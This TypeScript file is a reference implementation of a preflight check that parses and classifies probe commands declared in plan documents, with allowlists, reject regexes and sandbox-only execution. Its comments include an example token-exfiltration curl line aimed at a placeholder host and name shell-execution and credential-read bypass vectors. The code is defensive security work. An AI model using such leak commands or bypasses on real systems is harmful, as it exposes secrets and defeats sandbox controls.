/**
 * Reference implementation of preflight Check 10's parser + classifier.
 *
 * The production runtime is the bash in `plugins/soleur/skills/preflight/SKILL.md`
 * §"Check 10: Discoverability Test Execution". This TypeScript mirror exists
 * so the 8 decision states can be unit-tested without subshells, fake `curl`,
 * or live network. If the bash and TS drift, the bash wins and this file
 * is the bug.
 */

export type ExecResult = { rc: number; stdout: string };
export type Executor = (cmd: string, timeoutMs: number) => Promise<ExecResult>;

export type ClassificationResult = {
  // SKIP-DECLARED is deliberately NOT folded into SKIP: it is a verification
  // waiver a reviewer must be able to see (ADR-173 Layer 3).
  result: "PASS" | "FAIL" | "SKIP" | "SKIP-DECLARED" | "SKIP-NOSANDBOX";
  reason?: string;
};

export type ClassifyInput = {
  planPath: string;
  planBody: string;
  prBody: string;
  runner: Executor;
  timeoutMs?: number;
  /**
   * Whether the Step 10.5 bwrap sandbox can be established. Defaults to true so
   * existing callers are unaffected. When false the runtime SKIPs — it never
   * falls back to unsandboxed execution, because a skill claiming a boundary
   * that is not there is worse than one claiming none (ADR-173 Layer 1).
   */
  sandboxAvailable?: boolean;
};

// Use POSIX [:space:] equivalent (not \s) so the TS reject regex behaves
// identically to bash's [[:space:]] in C-locale. \s in JS matches Unicode
// whitespace (U+00A0, U+2028, etc.); bash [[:space:]] in C-locale does not.
// Keeping the surface narrow avoids cross-runtime drift bypasses.
const SSH_REJECT_RE = /(^|[\t\n\r \f\v/])ssh([\t\n\r \f\v]|$)/;

// Deny-by-default probe-verb allowlist — mirrors SKILL.md Step 10.4 (#7393).
//
// This REPLACED a denylist of ten credentialed CLIs, which was unbounded-negative
// by construction: it never caught indirect invocation (`bash scripts/foo.sh`
// whose body self-wraps `doppler run -c prd`), nor any future vendor CLI, nor an
// absolute-path read of a credential file by a permitted verb.
//
// This is a CORPUS-FREQUENCY list, not a capability list — each verb has >= 2
// uses in the measured corpus (ADR-173 §Layer 2 states the count and the
// extraction method). `sh`, `dig` and `getent` are absent on the same evidence:
// zero uses. `awk`/`sed`/`find` are absent for the same reason, NOT because they
// are uniquely dangerous — `git -c alias.x='!cmd' x` and `bash <script>` are
// full execution vectors and both are on the list.
//
// EVERY ENTRY IS AN AUTHORITY GRANT, and this gate bounds none of it. Authority
// is bounded by Step 10.5's sandbox and by nothing here. See probe-verb-gate.sh
// (the runtime of record) for why this layer is schema validation rather than a
// security or legibility control.
export const PROBE_VERB_ALLOWLIST = [
  "curl",
  "bash",
  "grep",
  "rg",
  "jq",
  "python3",
  "node",
  "bun",
  "printf",
  "git",
] as const;

// DELETED (ADR-173 revision, CTO ruling on #7393): the inline-program arg rules
// (`-c`/`-e`/`-p`/`--eval`/`--print`) and the repo-relative program-path rule.
//
// Both were removed because the gate's own sanctioned remedy — "wrap it in a
// repo-relative script" => `bash scripts/x.sh` — confers strictly MORE
// capability than anything they rejected, and Step 10.5 runs `bash -c "$CMD"`
// regardless, so every probe already is an inline program. They rejected a
// spelling, not a capability. Measured cost on the real corpus: 1 of the 2
// inline rejects was a false positive, the path rule fired once across the corpus,
// and both false-rejected legitimate probes (`bun test … -p`,
// `python3 … --print json`, `node … -e prod`). Negative value on both sides.
//
// Also deleted: the path-shaped exemption that skipped the allowlist whenever the
// first token contained `/`. It made `./doppler secrets get FOO` accept while a
// bare `doppler` rejected — i.e. it made "deny-by-default" false as printed.

// Placeholder text in a declaration waives nothing.
//
// This MUST be a superset of deepen-plan §4.7's set, because three artifacts
// claim it simply reuses that machinery. It did not: the two sets were disjoint
// on exactly the wrong members. Measured before this fix —
// `credentials_required: placeholder` and `credentials_required: manual operator
// check` both yielded SKIP-DECLARED, i.e. the two literal strings the rest of
// the repo treats as the canonical "this field says nothing" markers were the
// ones that GRANTED the waiver, on the cheapest path to a non-FAIL in the check.
//
// deepen-plan §4.7's set:  TODO TBD N/A placeholder "manual operator check"
// preflight's additions:   na none tktk ... <…>
const PLACEHOLDER_RE =
  /^(todo|tbd|n\/a|na|none|tktk|placeholder|manual operator check|\.\.\.|<.*>)$/i;

// Bash resolves `"doppler"`, `\doppler` and `dopp""ler` to the same binary, but the
// word-boundary anchors above cannot see through the quote characters. Strip them
// from a COPY before matching — mirrors the `CMD_DEQ` substitution in SKILL.md
// Step 10.4. Never strip from the string that would be executed.
const dequote = (cmd: string): string => cmd.replace(/["'\\]/g, "");

// Shell-active tokens that route command output / chain commands / spawn
// subshells / expand vars. The plan author is trust-on-PR-review but the env
// scrub in SKILL.md Step 10.5 is the load-bearing mitigation — this regex
// is defense-in-depth. Note: `$` (parameter expansion) IS rejected to block
// `curl https://api.example.com/?leak=$TOKEN` even with env scrub.
//
// `\n` closes BLOCK-mode chaining only: a block scalar joins with newlines,
// which `bash -c` runs as separate statements. It contributes zero coverage to
// folded scalars — see CRED_REJECT_RE above.
const SUBST_REJECT_RE = /(\$\(|`|<\(|>\(|;|&&|\|\||\||>|<|&|\n|\$\{?[A-Za-z_])/;

// Return the body of EVERY `## Observability` section (each: lines after the
// heading up to the next `^## ` heading). A doc may carry several such sections
// (e.g. plan-issue-templates.md ships one per verbosity tier), which the
// schema-parity guard walks. `extractObservabilityBlock` below is the
// first-block-only view the preflight runtime consumes.
export function extractAllObservabilityBlocks(planBody: string): string[] {
  const lines = planBody.split(/\r?\n/);
  const blocks: string[] = [];
  let collected: string[] | null = null;
  for (const line of lines) {
    if (/^## Observability(?:\s|$)/.test(line)) {
      if (collected) blocks.push(collected.join("\n"));
      collected = [];
      continue;
    }
    if (collected && /^## /.test(line)) {
      blocks.push(collected.join("\n"));
      collected = null;
      continue;
    }
    if (collected) collected.push(line);
  }
  if (collected) blocks.push(collected.join("\n"));
  return blocks;
}

// First `## Observability` section body — the view the preflight runtime consumes
// (plan bodies carry a single such section). NOTE: not byte-identical to a hand-
// written first-only loop for the malformed case of two ADJACENT `## Observability`
// headings with no intervening `^## ` — the old loop merged their bodies, this
// returns only the first. That input does not occur in real plans, so preflight
// behavior is unchanged; the split-then-`[0]` shape is what the parity guard needs.
export function extractObservabilityBlock(planBody: string): string {
  return extractAllObservabilityBlocks(planBody)[0] ?? "";
}

// Horizontal whitespace, POSIX [[:space:]] minus \n (lines are already split)
// and minus \r (stripped by the split — the documented CRLF divergence from awk).
// Deliberately NOT `\s`, which matches Unicode whitespace bash does not.
const H = "[ \\t\\f\\v]";
const FOLD_HEADER_RE = new RegExp(`^${H}*command:${H}*>[-+]?${H}*(#.*)?$`);
const BLOCK_HEADER_RE = new RegExp(`^${H}*command:${H}*\\|[-+]?${H}*(#.*)?$`);
const INLINE_KEY_RE = new RegExp(`^${H}*command:${H}*(\\S.*)$`);
const BLANK_RE = new RegExp(`^${H}*$`);

const indentOf = (line: string): number =>
  (new RegExp(`^${H}*`).exec(line)?.[0] ?? "").length;

export function parseCommand(observabilityBlock: string): string {
  const lines = observabilityBlock.split(/\r?\n/);

  // Form A — strict YAML key (strongest signal).
  //
  // Mirrors plugins/soleur/skills/preflight/scripts/parse-form-a.awk. That file
  // is authoritative; if these drift, the awk wins and this is the bug.
  //
  // Scalar extent follows YAML indent semantics: a continuation is a non-empty
  // line indented MORE than the `command:` key, and the first line indented <=
  // the key ends the scalar. No key-name matching — a key regex both truncates
  // legitimate content (a jq object filter's `host_present:`) and leaves a
  // differential where a LESS-indented non-key line is consumed anyway, which a
  // PR reviewer reads as outside the command but the shell executes.
  let mode: "fold" | "block" | null = null;
  let keyIndent = 0;
  const scalarLines: string[] = [];
  for (const line of lines) {
    if (mode === null) {
      // Fold/block headers MUST be tested before the inline rule: the inline
      // pattern also matches `command: >-` and would return the literal
      // indicator, which then self-rejects as a shell-active token (#6772).
      if (FOLD_HEADER_RE.test(line)) {
        mode = "fold";
        keyIndent = indentOf(line);
        continue;
      }
      if (BLOCK_HEADER_RE.test(line)) {
        mode = "block";
        keyIndent = indentOf(line);
        continue;
      }
      const inlineKey = line.match(INLINE_KEY_RE);
      if (inlineKey) return stripQuotes(inlineKey[1].trim());
      continue;
    }
    // Blank lines are legal inside a scalar and carry no indentation, so this
    // MUST precede the terminator or indentOf("") === 0 would end every scalar
    // at its first blank line. The awk drops them; this mirrors that (it used
    // to push "" and emit a spurious empty line).
    if (BLANK_RE.test(line)) continue;
    if (indentOf(line) <= keyIndent) break;
    scalarLines.push(line.replace(new RegExp(`^${H}+`), ""));
  }
  if (scalarLines.length > 0) {
    return scalarLines.join(mode === "fold" ? " " : "\n");
  }

  // Form B — prose `discoverability_test` marker + first fenced code block.
  let sawMarker = false;
  let inFence = false;
  const fenceLines: string[] = [];
  for (const line of lines) {
    if (!sawMarker && /discoverability_test/.test(line)) {
      sawMarker = true;
      continue;
    }
    if (!sawMarker) continue;
    if (/^\s*```/.test(line)) {
      if (!inFence) {
        inFence = true;
        continue;
      }
      break;
    }
    if (inFence) {
      if (/^\s*#/.test(line)) continue;
      fenceLines.push(line);
    }
  }
  return fenceLines.join("\n").trim();
}

export function parseExpected(observabilityBlock: string): string {
  const lines = observabilityBlock.split(/\r?\n/);
  for (const line of lines) {
    const yamlKey = line.match(/^\s*expected_output:\s*(.+)$/);
    if (yamlKey) return stripQuotes(yamlKey[1].trim());
  }
  // Prose form accepts bold-wrapped (`**Expected output:**`) since markdown
  // plans frequently bold the inline label. Both `Expected output:` and
  // `**Expected output:**` produce the same captured value.
  for (const line of lines) {
    const prose = line.match(/^\s*(?:\*\*)?Expected output:(?:\*\*)?\s*(.+)$/i);
    if (prose) return stripQuotes(prose[1].trim());
  }
  return "";
}

/**
 * Read the optional `credentials_required` sub-field of `discoverability_test`.
 *
 * SCOPED TO THE SUB-BLOCK, deliberately — which NARROWS the bypass class
 * without closing it: a `credentials_required:` line sitting inside the
 * command's own block scalar is still honoured, so a multi-line command can
 * still waive itself. Constraining to direct children would need a YAML-aware
 * parse the flat awk deliberately avoids. Stated rather than claimed closed. `expected_output` is read with a flat
 * whole-block scan and that is survivable, because a stray `expected_output:`
 * only changes what a probe is compared against. This field SKIPS EXECUTION
 * ENTIRELY, so the same flat read is a bypass rather than a parsing quirk:
 * measured, a `credentials_required:` line sitting under `liveness_signal:`, or
 * in prose anywhere in the `## Observability` section, waived a perfectly
 * runnable unauthenticated `curl` probe. One line, anywhere in the section,
 * silently disabled the check. The precedent does not transfer when the blast
 * radii differ this much.
 *
 * Three further shapes are rejected rather than honoured, each measured as a
 * silent waiver before this guard existed:
 *
 *   - a value that is only a `#` comment. The documented template ships
 *     `credentials_required: # OPTIONAL. Only when ...`, so an agent copying the
 *     canonical schema produced a valid-looking declaration whose "declared
 *     scope" was the template's own explanatory comment.
 *   - a bare block/folded indicator (`>` or `|`). #6772 made those first-class
 *     for `command:`, so an author following that pattern got SKIP-DECLARED with
 *     the justification `">"`.
 *   - an empty value.
 *
 * `parse-form-a.awk` is still deliberately NOT extended — it is pinned
 * byte-exactly against this file by the P1/P2/P3 parity harness.
 */
export function parseCredentialsRequired(observabilityBlock: string): string {
  const lines = observabilityBlock.split(/\r?\n/);
  const start = lines.findIndex((l) => /^\s*discoverability_test:/.test(l));
  if (start === -1) return "";
  const parentIndent = (lines[start].match(/^[ \t]*/) ?? [""])[0].length;

  for (const line of lines.slice(start + 1)) {
    if (line.trim() === "") continue;
    const indent = (line.match(/^[ \t]*/) ?? [""])[0].length;
    // Back to the parent's level or shallower => the sub-block ended.
    if (indent <= parentIndent) break;
    const m = line.match(/^\s*credentials_required:\s*(.*)$/);
    if (!m) continue;
    const raw = stripQuotes(m[1].trim());
    // A comment-only value, a bare block/fold indicator, or nothing at all
    // declares nothing — and a declaration that says nothing waives nothing.
    // The CHOMPED indicators are included for the same reason as the bare ones:
    // #6772 made `>-` / `|-` first-class for `command:`, so an author following
    // that pattern reaches for them FIRST. Omitting them covered the two shapes
    // least likely to be typed.
    if (
      raw === "" ||
      raw.startsWith("#") ||
      [">", ">-", ">+", "|", "|-", "|+"].includes(raw)
    )
      return "";
    return raw;
  }
  return "";
}

export function matchExpected(expected: string, actualStdout: string): boolean {
  const normalized = actualStdout.replace(/\n+$/, "").trim();
  if (normalized === "") return false;
  const tokens = tokenizeExpected(expected);
  return tokens.some((tok) => {
    if (tok === "") return false;
    // Short tokens (≤ 2 chars) match only when stdout is exactly the token —
    // prevents `expected_output: "0"` matching every HTTP error response that
    // happens to contain a `0` digit (500, 404, 200, 302, etc.).
    if (tok.length <= 2) return normalized === tok;
    return normalized.includes(tok);
  });
}

export function tokenizeExpected(expected: string): string[] {
  return expected
    .split(/,|\s+or\s+|\bor\b|[`"'\[\]/]+/i)
    .map((s) => s.trim())
    .filter((s) => s.length > 0);
}

/**
 * Normalize a parsed command before anything reads its verb.
 *
 * MIRRORS `probe-verb-gate.sh` — that script is the runtime of record and this
 * is the mirror; if they disagree the script wins and this is the bug. The
 * `probe-verb-gate-parity` test executes both over one fixture table precisely
 * so a disagreement cannot ship silently again.
 *
 * Two producer asymmetries make this necessary, and both shipped green before
 * the parity harness existed: Form B prints fenced lines VERBATIM (keeping
 * markdown indentation, so the verb was `""`), and a Form A block scalar can
 * carry a leading `#` comment line (so the verb was `"#"`). Both produced a FAIL
 * whose message named remedies that could not apply.
 */
export function normalizeCommand(cmd: string): string {
  return cmd
    .split(/\r?\n/)
    .filter((l) => !/^\s*#/.test(l) && l.trim() !== "")
    .join("\n")
    .trim();
}

/**
 * The effective verb: the first whitespace-delimited token of the NORMALIZED,
 * DEQUOTED command. Bash resolves `"doppler"`, `\doppler` and `dopp""ler` to the
 * same binary, so quoting must not launder the verb past the allowlist.
 */
export function effectiveVerb(cmd: string): string {
  return dequote(normalizeCommand(cmd)).split(/[\t\n\r \f\v]/)[0] ?? "";
}

export function rejectReason(cmd: string): string | null {
  if (SSH_REJECT_RE.test(cmd)) {
    return "discoverability_test.command contains ssh (rule violation per hr-observability-as-plan-quality-gate)";
  }

  // Ordered to mirror the runtime: Step 10.4's verb gate runs before Step 10.5's
  // shell-active-token reject.
  const verb = effectiveVerb(cmd);

  if (verb === "") {
    return "discoverability_test.command is empty after normalization — no command could be parsed. See plan-issue-templates.md §Observability for the canonical schema.";
  }

  // NO path-shaped exemption: a first token containing `/` used to skip this
  // check entirely, which admitted `./doppler secrets get FOO` and the prose
  // entry `gh/Sentry query for …` while a bare `doppler` rejected. Removing it
  // is what makes "deny-by-default" true as printed.
  if (!(PROBE_VERB_ALLOWLIST as readonly string[]).includes(verb)) {
    return `discoverability_test.command starts with \`${verb}\`, which is not on the probe-verb allowlist (${PROBE_VERB_ALLOWLIST.join(" ")}). Either wrap the probe in a repo-relative script committed in this same PR (\`bash scripts/<name>.sh …\`), or — if the probe genuinely cannot run without credentials — declare \`credentials_required\` on the discoverability_test block so Check 10 skips it explicitly. To permit a new verb for everyone, add it to PROBE_VERB_ALLOWLIST in a reviewed PR; every entry is an authority grant.`;
  }

  // Tested against the NORMALIZED command, and the runtime EXECUTES that same
  // normalized string — gating one form while executing another is the
  // laundering trap this check exists to avoid. Concretely: a leading `#`
  // comment line is not an executable statement, so it must not trip the
  // newline (block-chaining) reject; a genuine second statement still does.
  if (SUBST_REJECT_RE.test(normalizeCommand(cmd))) {
    return "discoverability_test.command contains shell-active token (;, &&, ||, |, >, <, &, $var, $(, `, <(, >() — refusing to run. Plans must compose single-statement commands without chaining or substitution.";
  }
  return null;
}

export async function classifyDiscoverabilityResult(
  input: ClassifyInput,
): Promise<ClassificationResult> {
  const {
    planPath,
    planBody,
    runner,
    timeoutMs = 15_000,
    sandboxAvailable = true,
  } = input;

  if (!planPath || planBody === "") {
    return {
      result: "SKIP",
      reason:
        "no plan file linked from PR body — Check 10 deferred to next preflight run after PR has a plan link",
    };
  }

  const block = extractObservabilityBlock(planBody);
  if (block === "") {
    return {
      result: "FAIL",
      reason: `plan ${planPath} is missing the ## Observability block (sensitive-path diff requires one per hr-observability-as-plan-quality-gate)`,
    };
  }

  const cmd = parseCommand(block);
  if (cmd === "") {
    return {
      result: "FAIL",
      reason: `plan ${planPath} declares an Observability block but no discoverability_test.command could be parsed (see plan-issue-templates.md §Observability for the canonical YAML schema)`,
    };
  }

  // Evaluation order mirrors the runtime:
  //   ssh reject -> credentials_required -> verb/arg/path gates ->
  //   shell-active reject -> sandbox availability -> sandboxed execute.
  //
  // `ssh` stays first and is NOT overridable by a declaration:
  // hr-observability-as-plan-quality-gate mandates a no-SSH probe unconditionally.
  if (SSH_REJECT_RE.test(cmd)) {
    return {
      result: "FAIL",
      reason:
        "discoverability_test.command contains ssh (rule violation per hr-observability-as-plan-quality-gate). A credentials_required declaration does NOT override this.",
    };
  }

  const credsRequired = parseCredentialsRequired(block);
  if (credsRequired !== "") {
    if (PLACEHOLDER_RE.test(credsRequired)) {
      return {
        result: "FAIL",
        reason: `discoverability_test.credentials_required is a placeholder ("${credsRequired}"). State the credential scope and why no unauthenticated probe verifies the same property, or remove the field.`,
      };
    }
    // INVERTED ADVISORY (ADR-173 Layer 3). Applying the verb gate to declared
    // probes as a REJECT would re-close the door #7393 opened — the motivating
    // case is `doppler run …`, and `doppler` is deliberately off the allowlist.
    // A plain advisory would fire on ~100% of declarations by construction, and
    // an always-on warning is noise. So it fires only in the case that is
    // actually suspicious: the declared command's verb is one Check 10 COULD
    // have executed, which means either the declaration is unnecessary or the
    // credential dependency is hidden inside a wrapped script.
    const declaredVerb = effectiveVerb(cmd);
    const advisory = (PROBE_VERB_ALLOWLIST as readonly string[]).includes(declaredVerb)
      ? ` (advisory: this command's verb \`${declaredVerb}\` is one Check 10 can execute — either the declaration is unnecessary, or the credential dependency is hidden inside a wrapped script)`
      : "";
    return {
      result: "SKIP-DECLARED",
      reason: `discoverability_test declares credentials_required — ${credsRequired}. Check 10 did NOT execute the command: running it inside the Step 10.5 sandbox would fail for lack of credentials and prove nothing about the property under test.${advisory}`,
    };
  }

  const rejected = rejectReason(cmd);
  if (rejected !== null) return { result: "FAIL", reason: rejected };

  // Fail-closed: no unsandboxed fallback, ever. A skill that claims a boundary
  // it does not have is worse than one that claims none.
  if (!sandboxAvailable) {
    // ITS OWN TERMINAL, never folded into ordinary SKIP.
    //
    // Folded, "the security gate verified nothing" was byte-identical to "the
    // gate correctly had nothing to do" (no sensitive paths, no PR, no plan) —
    // in the aggregate row, to /soleur:ship, and to the operator. That is the
    // blanket-disablement-that-looks-like-correct-operation failure this ADR's
    // own Sharp Edge names, and it shipped.
    //
    // The asymmetry made it plain: credentials_required waives ONE probe in ONE
    // plan and got three mechanical counterweights on the grounds that "prose is
    // not an enforcement mechanism"; this disables the check for EVERY plan,
    // permanently, on that host — and had none. bwrap is Linux-only, so on macOS
    // this is the steady state, not an exception.
    return {
      result: "SKIP-NOSANDBOX",
      reason:
        "Check 10 executes plan-declared commands only inside a bubblewrap (bwrap) sandbox, and the sandbox could not be established on this host (bwrap absent, or unprivileged user namespaces restricted). Refusing to run the probe unsandboxed. NOTE: bubblewrap is Linux-only — on macOS Check 10 is disabled permanently, not transiently.",
    };
  }

  const expected = parseExpected(block);
  // Execute the SAME normalized string the gate approved. Gating one form and
  // executing another is exactly the laundering gap that lets a rejected shape
  // reach the shell.
  const result = await runner(normalizeCommand(cmd), timeoutMs);

  if (result.rc === 6) {
    return {
      result: "FAIL",
      reason: `command failed DNS resolution (curl rc=6 — hostname did not resolve). Verify the hostname in plan ${planPath}'s discoverability_test.command.`,
    };
  }

  if (result.rc === 28 || result.rc === 124) {
    return {
      result: "FAIL",
      reason: `command timed out after ${timeoutMs} ms (rc=${result.rc}). Either the endpoint is unreachable or the command lacks --max-time.`,
    };
  }

  if (result.rc === 22 && /401|403/.test(result.stdout)) {
    const tokens = tokenizeExpected(expected);
    const listsAuth = tokens.some((t) => /401|403/.test(t));
    if (!listsAuth) {
      return {
        result: "SKIP",
        reason: `auth-gated probe returned ${result.stdout.trim()} but expected_output does not list 401/403. Add the auth shape to expected_output OR provision Doppler creds for the probe variant.`,
      };
    }
  }

  if (!matchExpected(expected, result.stdout)) {
    return {
      result: "FAIL",
      reason: `stdout mismatch: command returned ${JSON.stringify(result.stdout.trim())}, expected_output was ${JSON.stringify(expected)} (rc=${result.rc}). Plan's expectation has drifted from production reality.`,
    };
  }

  return { result: "PASS" };
}

function stripQuotes(value: string): string {
  return value.replace(/^["'](.*)["']$/, "$1");
}
